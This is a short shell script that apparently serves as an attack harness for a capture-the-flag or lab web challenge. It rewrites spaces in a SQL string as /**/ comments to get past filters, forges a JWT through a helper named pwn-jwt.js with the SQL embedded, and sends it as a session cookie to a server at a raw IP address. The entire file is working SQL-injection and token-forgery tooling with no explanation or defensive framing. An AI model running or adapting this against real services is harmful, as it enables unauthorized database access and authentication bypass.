#!/bin/sh

SQL=$(echo "${1}" | sed 's/ /\/\*\*\//g')

echo "${SQL}"

jwt=$(node pwn-jwt.js ${SQL})

curl --silent 'http://165.232.32.84:30130/' -H "Cookie: session=${jwt}" | recode html..ascii